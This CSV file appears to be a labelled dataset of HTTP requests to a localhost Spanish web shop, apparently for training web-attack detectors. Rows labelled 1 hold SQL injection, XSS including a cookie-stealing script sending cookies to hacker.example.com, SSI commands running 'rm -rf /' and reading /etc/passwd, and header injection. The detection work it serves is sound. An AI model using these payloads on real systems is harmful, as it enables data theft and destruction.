,request,label
543,gethttp://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
544,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mudie&pwd=a55r�4e1a&remember=on&b1=entrar,0
545,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lizzi&pwd=d2s32be�arse&remember=off&b1=entrar,0
546,gethttp://localhost:8080/tienda1/imagenes/cmenbul.gif,0
547,gethttp://localhost:8080/tienda1/publico/miembros.jsp,0
548,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=niu&pwd=broquel&remember=on&b1=entrar,0
549,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=alysia&password=cele959n3s0o&nombre=bettiana&apellidos=ewoldt+vaquer&email=nicova8@necesitocurro.kg&dni=72219452g&direccion=de+can+clos,+162+&ciudad=royo,+el&cp=45654&provincia=asturias&ntc=9365263775235809&b1=registrar",0
550,gethttp://localhost:8080/tienda1/miembros/index.jsp,0
551,gethttp://localhost:8080/tienda1/imagenes/logo.gif,0
552,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,0
553,gethttp://localhost:8080/tienda1/publico/productos.jsp,0
554,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7395&b1=confirmar,0
555,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,0
556,gethttp://localhost:8080/tienda1/imagenes/logo.gif,0
557,gethttp://localhost:8080/tienda1/publico/productos.jsp,0
558,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=begley&password=10lu15ll7&nombre=pridiliano&apellidos=vicente+cornell�&email=koster.gracindo@webhut.sy&dni=82521750g&direccion=fuenteheridos+129+&ciudad=bularros&cp=21520&provincia=vizcaya&ntc=5714386014521039&b1=registrar,0
559,gethttp://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
560,gethttp://localhost:8080/tienda1/index.jsp,0
561,gethttp://localhost:8080/tienda1/publico/productos.jsp,0
562,gethttp://localhost:8080/tienda1/publico/carrito.jsp,0
563,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,0
564,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,0
565,gethttp://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
566,gethttp://localhost:8080/tienda1/imagenes/3.gif,0
567,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,0
568,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=39&cantidad=3&b1=a�adir+al+carrito,0
569,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1,0
570,gethttp://localhost:8080/tienda1/imagenes/cmenbul.gif,0
571,gethttp://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
572,gethttp://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
573,gethttp://localhost:8080/tienda1/miembros/index.jsp,0
574,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=688&b1=confirmar,0
575,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n+ib�rico&precio=39&cantidad=34&b1=a�adir+al+carrito,0
576,gethttp://localhost:8080/tienda1/imagenes/2.gif,0
577,gethttp://localhost:8080/tienda1/global/estilos.css,0
578,gethttp://localhost:8080/tienda1/imagenes/2.gif,0
579,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n+ib�rico&precio=100&cantidad=43&b1=a�adir+al+carrito,0
580,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kwokchoi&password=logr_era&nombre=rub�&apellidos=cerd�&email=siku@tartasconamor.in&dni=82839528z&direccion=san+lazaro,+34+&ciudad=escamilla&cp=50491&provincia=le�n&ntc=6672454826209975&b1=registrar",0
581,posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=leyden&password=c96reveidil5&nombre=delia&apellidos=busoms+redolad&email=eyre9@ringringcargo.tn&dni=41022572w&direccion=las+palmeras+91+5b&ciudad=oca�a&cp=29691&provincia=murcia&ntc=9830070914840932&b1=registrar,0
582,gethttp://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
583,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,0
584,gethttp://localhost:8080/tienda1/miembros/salir.jsp,0
585,gethttp://localhost:8080/tienda1/imagenes/cmenbul.gif,0
586,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,0
587,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,0
588,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,0
589,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,0
590,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=178&b1=pasar+por+caja,0
591,gethttp://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
592,gethttp://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
593,gethttp://localhost:8080/tienda1/index.jsp,0
594,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,0
595,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito,0
596,gethttp://localhost:8080/tienda1/imagenes/1.gif,0
597,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6336&b1=pasar+por+caja,0
598,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas,0
599,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=rains8&password=atezada&nombre=amine&apellidos=deltell+riberas&email=rodvold@mytanga.om&dni=06044170t&direccion=calle+secretario+aguilar+196,+4-c&ciudad=ochagav�a/otsagabia&cp=10691&provincia=m�laga&ntc=7645298155512025&b1=registrar",0
0,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=messier&password=c7b183o&nombrea=nicodemo&apellidos=triola+villuend&email=galloway@rtce.gu&dni=35507822p&direccion=numero+15,+151,+&ciudad=castrillo+de+la+guare�a&cp=23657&provincia=toledo&ntc=1278501676319264&b1=registrar",1
1,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=set-cookie%3a+tamper%3d1041264011025374727,1
2,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
3,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=einersen&password=despagada&nombre=emanuel&apellidos=sarrasec+ar�valo&email=gottowt@enibiza.com.es'injected_param&dni=96118316m&direccion=passatge+del+sol,+0+13?d&ciudad=megeces&cp=42148&provincia=m�laga&ntc=8462242772116416&b1=registrar",1
4,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=percy&password=favo6ecedora&nombre=par�s&apellidosa=corral+rahal&email=healy@ajedrezconmaestros.ch&dni=15756299b&direccion=carrer+verge+de+l'alba,+s/n+&ciudad=san+morales&cp=15338&provincia=le�n&ntc=8682803216185712&b1=registrar",1
5,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
6,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=85/&cantidad=65&b1=a�adir+al+carrito,1
7,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kehoe&password=rose&nombre=genera&apellidos=marroig+cuadra&email=michalopoulo@s@graficascam@p.lk&dni=35475568t&direccion=calle+isabel+ii,+141+7e&ciudad=martiherrero&cp=50178&provincia=girona&ntc=4663857286858703&b1=registrar",1
8,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=+&login=befanis&pwd=pisonear&remember=off&b1=entrar,1
9,gethttp://localhost:8080/tienda1/global/creditos.jsp.inc,1
10,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dawn8&password=0h8buqu�&nombre=quinciano&apellidos=manzanera+agudo&email='+delete+from+users&dni=11051114m&direccion=c/+poceros,+29,+&ciudad=anna&cp=37797&provincia=ourense&ntc=5688192527960477&b1=registrar",1
11,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
12,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2579&b1a=confirmar,1
13,gethttp://localhost:8080/servlet/snoop,1
14,gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=omayma&password=fr78gen5e&nombre=olimpio&apellidos=pe�afiel&emaila=flagg@bacoespecialselecci�n.lb&dni=40888726q&direccion=prolongacion+jose+zorrilla+56+&ciudad=muxika&cp=06413&provincia=�vila&ntc=5771094131298411&b1=registrar,1
15,"posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=','0');waitfor+delay+'0:0:15';--",1
16,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=39&cantidad=45&b1=sessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>,1
17,gethttp://localhost:8080/tienda1.bak,1
18,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=coxall&password=9errero&nombre=vilma&apellidos=pad-oa,n+mol�&email=kwah-wu@921.cf&dni=38682401n&direccion=calle+francisco+altimiras,+154+&ciudad=muros+de+nal�n&cp=10840&provincia=burgos&ntc=2744860732185534&b1=registrar",1
19,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=teena&password=enranciar&nombre=julio&apellidos=guardiol+sim�&email=heuser@prensahp.mx&dni=31293475c&direccion=calle+rejas,+23,+4?b&ciudad=montiel&cp=08183&provincia=guadalajara&ntc=315877120463864&b1=registrar",1
20,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n+ib�rico&precio=85&cantidad=1&b1a=a�adir+al+carrito,1
21,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
22,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=nady&password=9va3831','0','0');waitfor+delay+'0:0:15';--&nombre=shirley&apellidos=urbaez+mariangel&email=erlich-jarrel@modeloscaninos.ni&dni=39759775c&direccion=algarrobo+197+3?f&ciudad=navalonguilla&cp=50268&provincia=segovia&ntc=5083698855321760&b1=registrar",1
23,gethttp://localhost:8080/tienda1/publico/asf-logo-wide.gif,1
24,gethttp://localhost:8080/tienda1/imagenes/3.gif/asf-logo-wide.gif/.inc,1
25,"posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=','0','0','0','0');waitfor+delay+'0:0:15';--",1
26,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%7c,1
27,gethttp://localhost:8080/tienda1/imagenes/2.gif/6909030637832563290.jsp,1
28,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
29,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2/&nombre=jam�n+ib�rico&precio=100&cantidad=28&b1=a�adir+al+carrito,1
30,gethttp://localhost:8080/tienda1/publico/registro.jsp.old,1
31,"posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito','0','0','0');waitfor+delay+'0:0:15';--",1
32,puthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam�n+ib�rico&precio=100&cantidad=55&b1=a�adir+al+carrito,1
33,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=');waitfor+delay+'0:0:15';--,1
34,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=leupold&password=f8i73a&nombre=rogaciano&apellidos=huasupoma+llobera&email=florath_cochran@hiperzaragoza.aq&dni=42620172e&direccion=c/+sagrados+corazones+27,+7?a&ciudad=villalbilla+de+gumiel&cp=1137a&provincia=zamora&ntc=1281104729948051&b1=registrar",1
35,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
36,gethttp://localhost:8080/tienda1/miembros/fotos.jsp/asf-logo-wide,1
37,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=100/&cantidad=66&b1=a�adir+al+carrito,1
38,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3/&nombre=jam�n+ib�rico&precio=85&cantidad=32&b1=a�adir+al+carrito,1
39,posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=luelle&password=mocet/ona&nombre=adoraci�n&apellidos=ridao+aloy&email=buckley9@faders.com.ai&dni=77983575m&direccion=cecilia+riera+118+13g&ciudad=galilea&cp=44358&provincia=guadalajara&ntc=0093197595343977&b1=registrar,1
40,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
41,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=any%0d%0aset-cookie%3a+tamper%3d5765205567234876235&b1=confirmar,1
42,gethttp://localhost:8080/tienda1/6909030637832563290.jsp,1
43,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=allix&password=ramad�n&nombre=yemina&apellidos=sejas+escriba&email=roe@prensahp.ge&dni=76844031l&direccion=c/+pintor+pedro+cabanes,+121+11b&ciudad=valle+de+hecho&cp=50783&provincia=hu??esca&ntc=6147677145944254&b1=registrar",1
44,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=luelle&password=calahorra""><!--#exec+cmd=""dir+""--><&nombre=adoraci�n&apellidos=ridao+aloy&email=buckley9@faders.com.ai&dni=77983575m&direccion=cecilia+riera+118+13g&ciudad=galilea&cp=44358&provincia=guadalajara&ntc=0093197595343977&b1=registrar",1
45,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1');waitfor+delay+'0:0:15';--,1
46,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectasparos%22%20style=%22background:url(javascript:alert('paros')),1
47,gethttp://localhost:8080/tienda1/4861362529278789730,1
48,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
49,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=chapdela&password=sacar*ificaci�n&nombre=gali<script>alert(""paros"");</script>&apellidos=pi�eriro+celayes&email=macgowan@comerciosdeaspe.kr&dni=47913001e&direccion=c/+virgen+de+la+esperanza+s/n,+9-b&ciudad=espadilla&cp=25791&provincia=ciudad+real&ntc=8410049060666952&b1=registrar",1
50,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=bob@<script>alert(paros)</script>.parosproxy.org&pwd=�12�a&remember=on&b1=entrar,1
51,gethttp://localhost:8080/tienda1/global.inc,1
52,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
53,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=set-cookie%3a+tamper%3d1041264011025374727,1
54,gethttp://localhost:8080/asf-logo-wide.bak,1
55,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=';+drop+table+usuarios;+select+*+from+datos+where+nombre+like+'%,1
56,gethttp://localhost:8080/tienda1/publico/registro.jsp/asf-logo-wide.gif,1
57,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1'or'a='a,1
58,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3833&b1=confirmar/,1
59,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
60,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=85&cantidad=17&b1=a�adir+al+carrito%7c,1
61,gethttp://localhost:8080/tienda1/miembros/~,1
62,"posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=','0');waitfor+delay+'0:0:15';--",1
63,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3754&b1=confirmarany%0aset-cookie%3a+tamper%3d1041264011025374727,1
64,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,1
65,gethttp://localhost:8080/tienda1/miembros/editar.jsp/4861362529278789730.old,1
66,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1408&b1=confirmar/,1
67,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=4580&b1=pasar+por+caja,1
68,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1'injected_param,1
69,posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kentaro&password=4up493a562i5&nombre=sulko&apellidos=mex�a+sebastia&email=oliveros@errebebe.ke&dni=11983001r&direccion=molinos+37+&ciudad=villanueva+del+rebollar+de+la+sierra&cp=31495bob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org&provincia=valladolid&ntc=2471595611305823&b1=registrar,1
70,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
71,"gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=898&b1=confirmar','0','0','0','0');waitfor+delay+'0:0:15';--",1
72,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&logina=robles&pwd=a6om00�4471&remember=off&b1=entrar,1
73,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3/&nombre=jam�n+ib�rico&precio=85&cantidad=80&b1=a�adir+al+carrito,1
74,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=bibbye&password=acordeonista&nombre=darian&apellidos=ospina+soma&email=swofford@showcars.com.nr&dni=37457070y&direccion=calle+maria+elv*ira+mu�iz,+126,+&ciudad=berrocalejo+de+aragona&cp=07669&provincia=guadalajara&ntc=6457209412215261&b1=registrar",1
75,gethttp://localhost:8080/tienda1/miembros/asf-logo-wide.gif.java,1
76,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=6090&b1=pasar+por+caja,1
77,gethttp://localhost:8080/tienda1.inc,1
78,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=meera&password=boquitue87a&nombre=safo&apellidos=koolmees+moliner&email=nomis@wormee.is&dni=13403604d&direccion=glorieta++d+e+antonio+machado,+18*3+8?e&ciudad=sol�rzano&cp=04212&provincia=burgos&ntc=5498057012879468&b1=registrar",1
79,gethttp://localhost:8080/tienda1/4861362529278789730,1
80,gethttp://localhost:8080.old,1
81,"gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas','0','0','0','0');waitfor+delay+'0:0:15';--",1
82,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2408&b1=confirmar/,1
83,gethttp://localhost:8080/tienda1.java,1
84,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modoa=registro&login=cash3&password=desfacci�n&nombre=eraldo&apellidos=varela+pulido&email=salminen_chew@suardistec.tw&dni=16864786j&direccion=c/+chalaneros,+188,+12-e&ciudad=junta+de+villalba+de+losa&cp=08787&provincia=guadalajara&ntc=4545565224454291&b1=registrar",1
85,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,1
86,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n+ib�rico&precio=100&cantidad=28&b1a=a�adir+al+carrito,1
87,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
88,gethttp://localhost:8080/tienda1/publico/autenticar.jsp/asf-logo-wide.gif/,1
89,gethttp://localhost:8080/tienda1/imagenes/1.gif.inc,1
90,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
91,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=ques+o+manchego&precio=85&cantidad=80&b1=a�adir+al+carrito,1
92,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=39&cantidad=%20&b1=a�adir+al+carrito,1
93,gethttp://localhost:8080/tienda1/asf-logo-wide.gif/.old,1
94,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
95,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,1
96,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
97,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
98,gethttp://localhost:8080/asf-logo-wide.gif,1
99,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=100set-cookie%3a+tamper%3d1041264011025374727&cantidad=55&b1=a�adir+al+carrito,1
100,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=39&cantidad=84&b1a=a�adir+al+carrito,1
101,"gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=<!--#exec+cmd=""rm+-rf+/;cat+/etc/passwd""+-->&login=world.fa&pwd=entremeter&remember=on&b1=entrar",1
102,gethttp://localhost:8080/flash/java/javabean/flashjavabean.html,1
103,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=rahn&pwd=28sca5�7&remember=on/&b1=entrar,1
104,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=wierzba&password=en62rm30a&nombre=adelfo&apellidos=mundaca+g�mez&email=ebersberg@23horas.kp&dni=78942434v'injected_param&direccion=periodista+jose+fernandez+martinez,+156+5?b&ciudad=navaconcejo&cp=44592&provincia=madrid&ntc=0883153406920438&b1=registrar",1
105,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
106,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
107,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tat7&password=p0on57cia008nto&nombre=camelia&apellidos=zurita+santander&email=diessl-claver@tradedeficit.mz&dni=59059811c&direccion=artes,+s/n+&ciudad=escobar+de+polendos&cp=18518&provincia=burgos&ntc=2636619315022095&b1=registrar""><!--#exec+cmd=""dir+""--><",1
108,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kimbra&pwd=any%0d%0aset-cookie%3a+tamper%3d5765205567234876235&remember=on&b1=entrar,1
109,gethttp://localhost:8080/events4.nsf,1
110,gethttp://localhost:8080/dspug.nsf,1
111,gethttp://localhost:8080/tienda1/global/creditos.jsp/.old,1
112,gethttp://localhost:8080/tienda1/imagenes/1.gif/4861362529278789730.old,1
113,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=20&b1=pasar+por+caja,1
114,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
115,gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=thur?ston&password=$leo&nombre=clacer&apellidos=roza+port�s&email=argibay_galabrue7@am-si.kn&dni=59004252y&direccion=pla�a+d'+hostafrancs+102+&ciudad=arjonilla&cp=37338&provincia=vizcaya&ntc=6040441906133947&b1=registrar,1
116,"posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=c/?a,ry&pwd=0ara7s5o&remember=on&b1=entrar",1
117,"gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=100','0','0','0');waitfor+delay+'0:0:15';--&cantidad=85&b1=a�adir+al+carrito",1
118,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre='+delete+from+users&precio=39&cantidad=63&b1=a�adir+al+carrito,1
119,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mea/c'h,um&password=9em6ll5r&nombre=noel�+de+lourdes&apellidos=nadal+ridaura&email=erlichman@alquilerpantallasled.pe&dni=29678532e&direccion=c/+rodriguez+castillejo,+36,+8?h&ciudad=sant+fruit�s+de+bages&cp=41001&provincia=segovia&ntc=8174057535388113&b1=registrar",1
120,gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=edlin4&password=5oy6nte&nombre=ralston&apellidos=pe�afiel&email=valente.oray@enlapalma.com.sh&dni=91076650p&direccion=publicista+jose+alegria+156+&ciudad=alhambra&cp=09109&provincia=cuenca&ntc=bob@<script>alert(paros)</script>.parosproxy.org&b1=registrar,1
121,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=seyfolla&pwd=46inquet48a&remembera=on&b1=entrar,1
122,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,1
123,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=346&b1a=confirmar,1
124,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=souba&password=duomesina&nombre=macedonia&apellidos=paul?lada/+subir?ana&email=motaung@hojainformativas.com.ee&dni=71823012s&direccion=c/+el+rubio,+155,+&ciudad=ciempozuelos&cp=13100&provincia=la+rioja&ntc=9142922555236896&b1=registrar",1
125,gethttp://localhost:8080/tienda1/miembros.old,1
126,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n+ib�rico&precio=39/&cantidad=90&b1=a�adir+al+carrito,1
127,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5080&b1=pasar+por+caja/,1
128,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=any%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727&login=maudie&password=cegato?so&nombre=yured&apellidos=modrego+aylagas&email=natzler.machiavelli@francislucille.cy&dni=68096192t&direccion=c/+carlos+de+la+rica,+8+11?a&ciudad=puigverd+d'agramunt&cp=08672&provincia=palencia&ntc=6396253761051262&b1=registrar",1
129,gethttp://localhost:8080/admin/login.do,1
130,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
131,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3471&b1=confirmar/,1
132,gethttp://localhost:8080/tienda1/global/titulo.jsp.inc,1
133,gethttp://localhost:8080/tienda1/asf-logo-wide.gif.bak,1
134,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
135,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=antonin&password=suplidora&nombre=any%3f%0aset-cookie%3a+tamper%3d5765205567234876235&apellidos=giorgis+zabala&email=merry@mcrspain.gg&dni=23625046k&direccion=pla�a+manuel+corachan+s/n,+9a&ciudad=coscurita&cp=08696&provincia=lleida&ntc=1573270411029963&b1=registrar",1
136,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=antone&password=7a4an4e&nombre=elpidio&apellidos=chocano+paramo&email=orchard@palomajimenez.so&dni=35314545t&direccion=c/+los+mineros+1,+&ciudad=navaconcejo&cp=10660&provincia=pontevedra&ntc=2558545383527310+&b1=registrar",1
137,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
138,gethttp://localhost:8080/4861362529278789730.inc,1
139,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=85&cantidad=';waitfor+delay+'0:0:15';--&b1=a�adir+al+carrito,1
140,gethttp://localhost:8080/tienda1.old,1
141,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9085&b1=confirmar/,1
142,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gonzaga&password=acontecimiento&nombre=redenta&apellidos=libano+parramon&email=vigran@maletti.cy&dni=24320656l&direccion=calle+tagarnina,+120,+13c&ciudad=roca+del+vall�s,+la&cp=10748&provinciaa=castell�n&ntc=6815796601581594&b1=registrar",1
